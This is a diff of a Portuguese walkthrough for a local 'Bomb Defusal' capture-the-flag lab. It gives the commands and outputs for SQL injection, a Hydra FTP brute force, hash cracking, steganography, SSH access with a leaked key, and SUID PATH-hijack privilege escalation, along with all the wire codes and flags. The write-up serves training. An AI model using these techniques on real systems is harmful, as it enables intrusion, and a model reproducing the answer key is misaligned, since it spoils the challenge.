@@ -1,49 +1,80 @@
 # Walkthrough - Bomb Defusal CTF
 
-Este walkthrough descreve o caminho esperado de exploracao do CTF.
-```
+Este walkthrough descreve o passo a passo esperado para a resolução do CTF criado pelos desenvolvedores, sendo possível a existência de outras sequências por caminhos não intencionais.
 
-## 1. Reconhecimento
+O fluxo da solução consiste em: enumeração dos serviços, início do desafio pela interface web, resolução dos oito fios, desarme da bomba, acesso SSH e escalada de privilégios.
 
-superficie de ataque: servicos expostos para web, FTP e SSH.
+## 1. Enumeração das Portas
 
-Como identificar:
+Superfície de ataque: FTP, SSH e HTTP.
+
+Espera-se identificar os serviços com este comando ou similar:
 
 ```bash
-nmap -T4 <ALVO> -A
+nmap -T4 localhost -A
 ```
 
-Resultado esperado:
+O resultado será:
 
 ```text
-FTP aberto
-SSH aberto
-HTTP aberto
+21/tcp   open  ftp     vsftpd 3.0.2
+2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
+8000/tcp open  http    Apache httpd 2.4.67 ((Debian))
 ```
 
-Enumere a aplicacao web:
+## 2. Enumeração dos Diretórios Web
+
+Espera-se identificar os diretórios públicos com este comando ou similar:
 
 ```bash
-gobuster dir -u http://<ALVO>:<PORTA_HTTP> \
+gobuster dir -u http://localhost:8000 \
 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
 -x php,html,txt,css,js
 ```
 
-O esperado e encontrar a aplicacao principal e diretorios publicos de conteudo. Inicie o desafio pela interface web antes de acessar os fios.
+O resultado será:
 
-## 2. Fio Vermelho - Base64 Repetido
+```text
+/index.php            (Status: 200)
+/Content              (Status: 301) [--> http://localhost:8000/Content/]
+/Assets               (Status: 301) [--> http://localhost:8000/Assets/]
+```
 
-Vulnerabilidade ou falha: dado sensivel protegido apenas por codificacao reversivel.
+## 3. Acesso ao `/` da Aplicação Web
 
-Como identificar:
+O usuário deve acessar a raiz da aplicação e iniciar o desafio clicando em `Start Challenge`. Até isso acontecer, todas as páginas dos fios estarão bloqueadas.
 
-- A pagina mostra um texto grande com formato compativel com Base64.
-- O comentario HTML sugere uma potencia de dois.
+```text
+http://localhost:8000/
+```
 
-Exploracao esperada:
+Após iniciar o desafio, o painel da bomba exibirá os oito fios. Cada fio leva para uma etapa diferente e cada código errado digitado no painel remove 60 segundos do temporizador.
+
+## 4. Fio Vermelho - Base64 Repetido
+
+Primeira vulnerabilidade: dado sensível protegido por Base64 aplicado 32 vezes.
+
+Dica do hacker:
+
+```html
+<!-- Hello, secret agent... -->
+<!-- I knew they’d send you—they’re so predictable 🙄... -->
+<!-- Well, as you can see, I tend to go a bit overboard, but that’s what they say: "When in doubt, use a power of two." -->
+```
+
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
+
+- A string tem formato de Base64, incluindo padding com `==`, bem característico desse tipo de codificação.
+- Base64 aumenta o tamanho do conteúdo. Ao ver uma string Base64 muito grande, o usuário deve considerar que ela pode ter sido codificada múltiplas vezes.
+- A dica do hacker fala em uma potência de dois.
+- Sendo assim, é lógico testar quantidades como `2`, `4`, `8`, `16`, `32` e `64`.
+- É responsabilidade do usuário tentar essas possibilidades em ordem crescente até encontrar uma saída legível.
+
+Solução:
+
+Salvar o conteúdo do fio em `red_work.txt` e decodificar a string 32 vezes em Base64:
 
 ```bash
-cp red_payload.txt red_work.txt
 for i in $(seq 1 32); do
     base64 -d red_work.txt > red_next.txt
     mv red_next.txt red_work.txt
@@ -54,166 +85,264 @@ cat red_work.txt
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_VERMELHO>
+AF32CD
 ```
 
-## 3. Fio Laranja - Hash com Salt
+O código `AF32CD` deve ser inserido no painel para cortar o fio vermelho.
 
-Vulnerabilidade ou falha: uso de hash fraco com salt previsivel e senha presente em wordlist.
+## 5. Fio Laranja - Hash MD5 com Salt
 
-Como identificar:
+Segunda vulnerabilidade: hash feito com senha fraca e com salt exposto por dica.
 
-- A pagina exibe um hash.
-- O comentario HTML indica que ha um salt.
-- O tamanho do hash sugere MD5.
+Dica do hacker:
 
-Exploracao esperada:
+```html
+<!-- Hi, Secret Agent, orange is my favorite color 🤠. -->
+<!-- Is orange your favorite color too??? Wow, what an explosive revelation 🤯. -->
+<!-- Well, since you have good taste, here’s a great tip: things always get better with a bit of salt, especially if that salt is a “BOMB” 💥💥💥💥💥💥. -->
+```
+
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
+
+- A página exibe o hash `54d5cfb704d716a9057b549c3620f559`.
+- O hash tem 32 caracteres hexadecimais, formato compatível com MD5.
+- A dica do hacker informa que existe um salt e deixa claro que o salt é `BOMB`.
+- O usuário não sabe inicialmente se o hash foi feito como `senha + salt` ou `salt + senha`.
+- Portanto, ele deve testar as duas possibilidades.
+
+Solução:
 
 ```bash
-hashcat -m 10 -a 0 <HASH>:<SALT_INDICADO_NA_PISTA> \
-/usr/share/wordlists/rockyou.txt --show
+hashcat -m 10 -a 0 54d5cfb704d716a9057b549c3620f559:BOMB \
+/usr/share/wordlists/rockyou.txt
+
+hashcat -m 10 54d5cfb704d716a9057b549c3620f559:BOMB --show
 ```
 
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_LARANJA>
+C0FFEE
 ```
 
-## 4. Fio Amarelo - Esteganografia em Video e Audio
+O código `C0FFEE` deve ser inserido no painel para cortar o fio laranja.
 
-Vulnerabilidade ou falha: informacao sensivel escondida em arquivos de midia.
+## 6. Fio Amarelo - Esteganografia em Vídeo e Áudio
 
-Como identificar:
+Terceira vulnerabilidade: segredo escondido em arquivo de mídia fornecido.
 
-- A pagina entrega um arquivo de video.
-- O comentario HTML chama atencao para o audio.
-- Arquivos de midia devem ser analisados por trilhas e conteudo embutido.
+Dica do hacker:
 
-Exploracao esperada:
+```html
+<!-- Hi, Secret Agent 🥸. -->
+<!-- I was thinking—since we have so much in common—maybe we’d get along really well as friends 🤔… -->
+<!-- Well, as my newest friend, I want to share an amazing moment with you: watch one of the best free-kick takers in action ⚽. -->
+<!-- Pay close attention to how this audio is simply mind-blowing 🥶💣. -->
+```
+
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
+
+- A página entrega o arquivo `Content/challenge.mkv`.
+- A dica do hacker chama atenção para o áudio.
+- Arquivos de vídeo podem conter trilhas de áudio, dados embutidos e outros arquivos anexados.
+- A referência ao melhor cobrador de faltas leva ao nome `JUNINHO_PERNAMBUCANO`.
+
+Solução:
+
+Baixar o vídeo:
 
 ```bash
-wget http://<ALVO>:<PORTA_HTTP>/Content/challenge.mkv
+curl -s "http://localhost:8000/Content/challenge.mkv" -o challenge.mkv
+```
+
+Extrair o áudio:
+
+```bash
 ffmpeg -i challenge.mkv -vn -c:a pcm_s16le extracted_audio.wav
 ```
 
-Extraia a mensagem escondida no audio:
+Extrair a senha escondida no áudio:
 
 ```bash
-steghide extract -sf extracted_audio.wav -p ""
+steghide extract -sf extracted_audio.wav -p "" -xf audio_password.txt
 cat audio_password.txt
 ```
 
-Procure conteudo embutido no video:
+Resultado esperado:
+
+```text
+PASSWORD:`THE_BEST_FREE_KICK_TAKER_IS_JUNINHO_PERNAMBUCANO`
+```
+
+Procurar arquivos embutidos no vídeo:
 
 ```bash
-binwalk challenge.mkv
 binwalk -e challenge.mkv
 find _challenge.mkv.extracted -type f -name "*.zip"
 ```
 
-Abra o ZIP extraido usando a senha recuperada do audio:
+Resultado esperado:
+
+```text
+_challenge.mkv.extracted/13C6675.zip
+```
+
+Abrir o ZIP usando a senha recuperada no áudio:
 
 ```bash
-unzip <ZIP_EXTRAIDO>
+unzip -P THE_BEST_FREE_KICK_TAKER_IS_JUNINHO_PERNAMBUCANO \
+_challenge.mkv.extracted/13C6675.zip
+
 cat yellow_code.txt
 ```
 
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_AMARELO>
+FE21DA
 ```
 
-## 5. Fio Verde - SQL Injection com Bypass de Filtro Client-Side
+O código `FE21DA` deve ser inserido no painel para cortar o fio amarelo.
 
-Vulnerabilidade: SQL injection por concatenacao direta de parametros no backend.
+## 7. Fio Verde - SQL Injection com Bypass de Filtro Client-Side
 
-Como identificar:
+Quarta vulnerabilidade: SQL Injection por concatenação direta de parâmetros no backend.
 
-- A pagina apresenta um formulario de login.
-- O JavaScript bloqueia tokens como aspas, comentarios SQL e operadores logicos.
-- A validacao ocorre no navegador, nao necessariamente no servidor.
-- Interceptando a requisicao, e possivel alterar o corpo do POST depois da validacao local.
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
 
-Exploracao esperada:
+- A página apresenta um formulário de login.
+- O JavaScript bloqueia caracteres e tokens comuns de SQL Injection.
+- O bloqueio acontece no navegador, antes da requisição ser enviada.
+- Validações feitas apenas no cliente podem ser ignoradas interceptando ou montando a requisição manualmente.
+- O backend concatena os parâmetros diretamente na query SQL.
 
-1. Abra o fio verde no navegador.
-2. Intercepte o POST com Burp Suite.
-3. Envie um payload que comente a verificacao da senha.
+Solução:
 
-Modelo de payload:
+Interceptar o POST do formulário com Burp Suite e inserir um SQLi, como admin ' OR 1=1 --.
+
+
+Após a execução do bypass da login o usuário terá acesso ao código do fio:
 
 ```text
-username=<USUARIO_VALIDO>'-- 
-password=<QUALQUER_VALOR>
+071EBD
+```
+
+O código `071EBD` deve ser inserido no painel para cortar o fio verde.
+
+## 8. Fio Azul - Rota Oculta
+
+Quinta vulnerabilidade: rota sensível acessível por um valor de `route` descoberto por wordlist.
+
+Dica do hacker:
+
+```html
+<!-- Look who's still here, Secret Agent 🙄. -->
+<!-- Trying to find the secret route in my perfectly designed system? How original 🥱. -->
+<!-- Since you clearly have absolutely no idea where you are going, I decided to leave you some light reading material 📖. -->
+<!-- I appropriately named it "good_luck_mister.txt", because you are going to need a miracle to guess the right path 🍀. -->
+<!-- Go ahead, keep aggressively knocking on every single door like a brute. I just love watching you try to *fuzz* your way out of this one 🚪🥊. -->
+<!-- Tick-tock, mister... tick-tock ⏱️💥. -->
+```
+
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
+
+- A página disponibiliza a wordlist `good_luck_mister.txt`.
+- A dica do hacker fala em encontrar uma rota secreta.
+- A dica também usa diretamente a ideia de fuzzing.
+- A aplicação usa o parâmetro `route` para controlar qual página será carregada.
+
+Solução:
+
+Baixar a wordlist:
+
+```bash
+curl -s "http://localhost:8000/Content/goodluck.txt" -o goodluck.txt
+```
+
+Fazer fuzzing no parâmetro `route`:
+
+```bash
+ffuf -u "http://localhost:8000/index.php?route=FUZZ" \
+-w goodluck.txt -mc all -fs 15
 ```
 
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_VERDE>
+hermanos
 ```
 
-## 6. Fio Azul - Fuzzing de Rota
-
-Vulnerabilidade ou falha: rota secreta acessivel por parametro previsivel.
-
-Como identificar:
-
-- A pagina do fio disponibiliza uma wordlist.
-- O comentario HTML sugere fuzzing.
-- A aplicacao usa o parametro `route` para roteamento interno.
-
-Exploracao esperada:
-
-```bash
-wget http://<ALVO>:<PORTA_HTTP>/Content/goodluck.txt
-ffuf -u "http://<ALVO>:<PORTA_HTTP>/index.php?route=FUZZ" -w goodluck.txt
-```
-
-Acesse a rota encontrada:
+Acessar a rota encontrada:
 
 ```text
-http://<ALVO>:<PORTA_HTTP>/index.php?route=<ROTA_ENCONTRADA>
+http://localhost:8000/index.php?route=hermanos
 ```
 
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_AZUL>
+A7F3C9
 ```
 
-## 7. Fio Rosa - FTP e Brute Force
+A página também mostra a pista `Junior! Create harder challenges!`, que será usada no FTP.
 
-Vulnerabilidade ou falha: senha fraca em servico FTP.
+O código `A7F3C9` deve ser inserido no painel para cortar o fio azul.
 
-Como identificar:
+## 9. Fio Rosa - FTP com Credencial Fraca
 
-- O reconhecimento inicial mostra FTP aberto.
-- O comentario HTML do fio sugere uma ferramenta de brute force.
-- O desafio fornece pistas suficientes para escolher um usuario candidato.
+Sexta vulnerabilidade: senha fraca em serviço FTP.
 
-Exploracao esperada:
+Dica do hacker:
+
+```html
+<!-- Well, well, well, Secret Agent... still snooping around my ports? 🕵️‍♂️ -->
+<!-- It seems you're trying to get some highly classified files now 📁🗄️. -->
+<!-- Good luck with that! My server is locked up tight, and standard guessing won't get you anywhere near my password 🚫. -->
+<!-- You are going to need a real monster to break into this one... maybe a legendary, multi-headed beast? 🐉🌊 -->
+```
+
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
+
+- A enumeração inicial mostrou FTP aberto na porta `21`.
+- A dica do hacker fala em arquivos classificados.
+- A dica também menciona uma criatura de várias cabeças, referência à ferramenta Hydra.
+- A etapa anterior revelou o nome `Junior`, usado como candidato de usuário.
+
+Solução:
+
+Usar Hydra para testar a senha do usuário `Junior`:
 
 ```bash
-hydra -l <USUARIO_FTP> -P /usr/share/wordlists/rockyou.txt ftp://<ALVO>
+hydra -l Junior -P /usr/share/wordlists/rockyou.txt -s 21 ftp://localhost -I -f
 ```
 
-Com a credencial encontrada, entre no FTP:
+Resultado esperado:
+
+```text
+[21][ftp] host: localhost   login: Junior   password: ronaldinho
+```
+
+Entrar no FTP:
 
 ```bash
-ftp <ALVO>
+ftp localhost
 ```
 
-Baixe os arquivos:
+Credenciais:
+
+```text
+Name: Junior
+Password: ronaldinho
+```
+
+Baixar os arquivos:
 
 ```text
 get code.txt
 get secret.zip
 ```
 
-Leia a mensagem:
+Ler o arquivo `code.txt`:
 
 ```bash
 cat code.txt
@@ -222,136 +351,203 @@ cat code.txt
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_ROSA>
-<USER_AGENT_VALIDO>
+Congratulation, agent BombDefuser! Where is your reward:
+DEADC0
 ```
 
-Guarde o `secret.zip`; ele sera usado na etapa de acesso ao sistema.
+O código `DEADC0` deve ser inserido no painel para cortar o fio rosa.
 
-## 8. Fio Roxo - Controle por User-Agent
+O arquivo `secret.zip` deve ser guardado. Ele será usado depois do desarme da bomba.
 
-Vulnerabilidade ou falha: autorizacao baseada apenas no cabecalho `User-Agent`.
+## 10. Fio Roxo - Autorização por User-Agent
 
-Como identificar:
+Sétima vulnerabilidade: autorização baseada apenas no cabeçalho `User-Agent`.
 
-- Sem o cabecalho correto, a aplicacao retorna acesso negado.
-- A mensagem obtida no FTP indica o agente esperado.
-- A autorizacao depende do valor textual do cabecalho HTTP.
+Dica do hacker ao acessar sem o agente correto:
 
-Exploracao esperada:
-
-```bash
-curl -A "<USER_AGENT_VALIDO>" \
-"http://<ALVO>:<PORTA_HTTP>/index.php?route=wire&id=<ID_FIO_ROXO>"
+```html
+<!-- ACCESS DENIED. 🚨❌ -->
+<!-- Ouch... that's got to hurt your ego, Secret Agent 🤫. -->
+<!-- Did you really think my server would just let *anyone* in? You're wearing the wrong outfit. -->
+<!-- This door is strictly reserved for a very exclusive "agent", and right now, your request is looking completely generic 🥱. -->
 ```
 
-Resultado esperado:
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
+
+- Sem o cabeçalho correto, o acesso é negado.
+- A dica fala em vestir a roupa errada e em um `agent` exclusivo.
+- O FTP revelou o texto `agent BombDefuser`.
+- Logo, `BombDefuser` deve ser usado como valor do cabeçalho `User-Agent`.
+
+Solução:
+
+Interceptar a requisição com Burp Suite e alterar o `User-Agent` para `BombDefuser`.
+
+A página irá exibir o código do fio:
 
 ```text
-<CODIGO_FIO_ROXO>
+4C9E2B
 ```
 
-## 9. Fio Ciano - Esteganografia em PNG
+O código `4C9E2B` deve ser inserido no painel para cortar o fio roxo.
 
-Vulnerabilidade ou falha: informacao sensivel escondida nos bits de uma imagem.
+## 11. Fio Ciano - Esteganografia em PNG
 
-Como identificar:
+Oitava vulnerabilidade: segredo escondido nos bits menos significativos de uma imagem pública.
 
-- A pagina exibe uma imagem.
-- Nao ha formulario nem logica web aparente.
-- Imagens de CTF costumam exigir analise de metadados ou LSB.
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
 
-Exploracao esperada:
+- A página exibe apenas uma imagem: `Content/trophy.png`.
+- Não existe formulário, texto codificado ou lógica web aparente.
+- Em desafios de CTF, imagens sem interação costumam indicar análise de metadados ou esteganografia.
+- A técnica LSB é uma tentativa natural para arquivos PNG.
+
+Solução:
+
+Analisar a imagem com o programa `zsteg`:
 
 ```bash
-wget http://<ALVO>:<PORTA_HTTP>/Content/trophy.png
 zsteg trophy.png
 ```
 
+Informação relevante esperada:
+
+```text
+b1,rgb,lsb,xy       .. text: "flag{5AFECA}"
+```
+
+O código `5AFECA` deve ser inserido no painel para cortar o fio ciano.
+
+## 12. Desarme da Bomba
+
+Depois de recuperar os oito códigos, o usuário deve voltar ao painel principal e inserir cada código no teclado hexadecimal. A ordem não importa e isso pode ser feito em qualquer momento do CTF.
+
+Resumo dos códigos:
+
+| Fio | Código |
+| --- | --- |
+| Vermelho | `AF32CD` |
+| Laranja | `C0FFEE` |
+| Amarelo | `FE21DA` |
+| Verde | `071EBD` |
+| Azul | `A7F3C9` |
+| Rosa | `DEADC0` |
+| Roxo | `4C9E2B` |
+| Ciano | `5AFECA` |
+
 Resultado esperado:
 
 ```text
-<CODIGO_FIO_CIANO>
+Todos os fios cortados.
+Bomba desarmada.
 ```
 
-## 10. Desarme da Bomba
-
-Depois de recuperar os oito codigos, volte ao painel principal da bomba e insira cada codigo no teclado hexadecimal.
-
-Resultado esperado:
+Após o desarme, o display alterna entre `SAFE` e o código final:
 
 ```text
-Todos os fios cortados
-Bomba desarmada
+D3F347
 ```
 
-## 11. Acesso SSH
+Esse código é a senha do `secret.zip` baixado no FTP.
 
-Vulnerabilidade ou falha: material de autenticacao exposto por cadeia de exploracao anterior.
+## 13. Acesso SSH
 
-Como identificar:
+Nona vulnerabilidade: chave privada exposta dentro do ZIP obtido na cadeia do desafio.
 
-- O FTP fornece `secret.zip`.
-- O ZIP contem material usado na etapa de acesso.
-- Se o ZIP solicitar senha, trate-o como mais um artefato a ser quebrado ou extraido com a senha recuperada na cadeia de pistas.
-- O SSH estava exposto desde o reconhecimento inicial.
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
 
-Exploracao esperada:
+- O FTP forneceu o arquivo `secret.zip`.
+- A senho do ZIP ainda não tinha sido fornecida.
+- Após desarmar a bomba, o painel exibe `D3F347` que pelo formato do CTF indica um dado importante.
+- Essa senha abre o ZIP e revela uma chave privada SSH.
+- A enumeração inicial mostrou SSH aberto na porta `2222`.
+
+Solução:
+
+Abrir o ZIP:
 
 ```bash
-unzip secret.zip
-chmod 600 id_rsa
-ssh -i id_rsa <USUARIO_SSH>@<ALVO> -p <PORTA_SSH>
+unzip -P D3F347 secret.zip
 ```
 
-Caso o ZIP esteja protegido, extraia ou quebre a senha antes:
+Arquivos esperados:
+
+```text
+id_rsa
+truth.txt
+```
+
+Ler a mensagem:
 
 ```bash
-zip2john secret.zip > secret_zip.hash
-john --wordlist=<WORDLIST> secret_zip.hash
-john --show secret_zip.hash
-unzip -P <SENHA_ZIP> secret.zip
+cat truth.txt
+```
+
+A mensagem aponta para `/root/secret`, indicando que ainda existe uma etapa privilegiada.
+
+Acessar o SSH como `junior`:
+
+```bash
 chmod 600 id_rsa
-ssh -i id_rsa <USUARIO_SSH>@<ALVO> -p <PORTA_SSH>
+ssh -i id_rsa junior@localhost -p 2222
+```
+
+Confirmar o acesso:
+
+```bash
+cat /home/junior/user.txt
 ```
 
 Resultado esperado:
 
 ```text
-Shell como usuario nao privilegiado
+CTF{b0mb_h4s_b33n_pl4n73d}
 ```
 
-## 12. Escalada de Privilegios - SUID e PATH Hijacking
+## 14. Escalada de Privilégios - SUID e PATH Hijacking
 
-Vulnerabilidade: binario SUID executando comando externo sem caminho absoluto.
+Decima vulnerabilidade: binário SUID executando comando externo sem caminho absoluto.
 
-Como identificar:
+O usuário deve chegar a essa conclusão devido aos seguintes indicativos:
 
-Enumere binarios SUID:
+- A mensagem do `truth.txt` aponta para `/root/secret`.
+- O usuário `junior` não tem permissão direta para acessar `/root`.
+- A enumeração de binários SUID revela `/usr/local/bin/detonate`.
+- O código-fonte mostra `system("rm -rf /root/secret");`.
+- Como `rm` não usa caminho absoluto, o binário depende do `PATH` do usuário.
+
+Solução:
+
+Enumerar binários SUID:
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-Analise o binario suspeito:
+Binário relevante:
+
+```text
+/usr/local/bin/detonate
+```
+
+Analisar o binário e o código-fonte:
 
 ```bash
 ls -l /usr/local/bin/detonate
 cat /var/www/app/Jobs/detonate.c
 ```
 
-O problema esperado e uma chamada semelhante a:
+Trecho vulnerável:
 
 ```c
 system("rm -rf /root/secret");
 ```
 
-Como `rm` nao usa caminho absoluto, o sistema procura esse binario pelo `PATH`. Com isso, um atacante pode colocar um `rm` falso antes do diretorio real.
-
-Exploracao esperada:
+Criar um `rm` falso antes do `rm` real no `PATH`:
 
 ```bash
 mkdir -p /tmp/hijack
+
 cat > /tmp/hijack/rm <<'EOF'
 #!/bin/sh
 id > /tmp/path_hijack_proof.txt
@@ -359,16 +555,17 @@ cat /root/flag.txt > /tmp/root_flag.txt
 chmod 644 /tmp/root_flag.txt
 exit 0
 EOF
+
 chmod +x /tmp/hijack/rm
 ```
 
-Execute o binario SUID com o `PATH` controlado:
+Executar o binário SUID com o `PATH` controlado:
 
 ```bash
 PATH=/tmp/hijack:$PATH /usr/local/bin/detonate
 ```
 
-Confirme a execucao privilegiada:
+Confirmar a execução como root:
 
 ```bash
 cat /tmp/path_hijack_proof.txt
@@ -378,20 +575,21 @@ cat /tmp/root_flag.txt
 Resultado esperado:
 
 ```text
-<PROVA_DE_EXECUCAO_COMO_ROOT>
-<FLAG_ROOT>
+uid=0(root) gid=0(root) groups=0(root),33(www-data),1000(junior)
+CTF{b0mb_h4s_b33n_d3fus3d}
 ```
 
-## Resumo das Vulnerabilidades
+## Resumo das Falhas e Vulnerabilidades
 
-| Etapa | Vulnerabilidade ou tecnica | Quebra esperada |
+| Etapa | Classificação | Quebra esperada |
 | --- | --- | --- |
-| Fio vermelho | Codificacao reversivel | Base64 repetido |
-| Fio laranja | Hash fraco com salt previsivel | Hashcat com wordlist |
-| Fio amarelo | Esteganografia em midia | ffmpeg, steghide e binwalk |
-| Fio verde | SQL injection | Bypass de filtro client-side via Burp |
-| Fio azul | Rota oculta previsivel | Fuzzing com ffuf |
-| Fio rosa | Senha fraca no FTP | Hydra com wordlist |
-| Fio roxo | Autorizacao por User-Agent | Cabecalho HTTP customizado |
-| Fio ciano | Esteganografia em PNG | zsteg |
-| Escalada | SUID com PATH hijacking | Binario falso no PATH |
+| Fio vermelho | Falha criptográfica | Base64 repetido 32 vezes |
+| Fio laranja | Falha criptográfica | MD5 com salt testando `senha + salt` e `salt + senha` |
+| Fio amarelo | Falha de exposição | Esteganografia em áudio e ZIP embutido no vídeo |
+| Fio verde | Vulnerabilidade | SQL Injection no backend |
+| Fio azul | Falha de controle de acesso | Rota oculta descoberta por fuzzing |
+| Fio rosa | Vulnerabilidade | Credencial fraca no FTP |
+| Fio roxo | Vulnerabilidade | Autorização por `User-Agent` |
+| Fio ciano | Falha de exposição | Segredo em LSB de PNG |
+| SSH | Falha de exposição | Chave privada dentro do ZIP pós-desarme |
+| Escalada | Vulnerabilidade local | SUID com PATH hijacking |
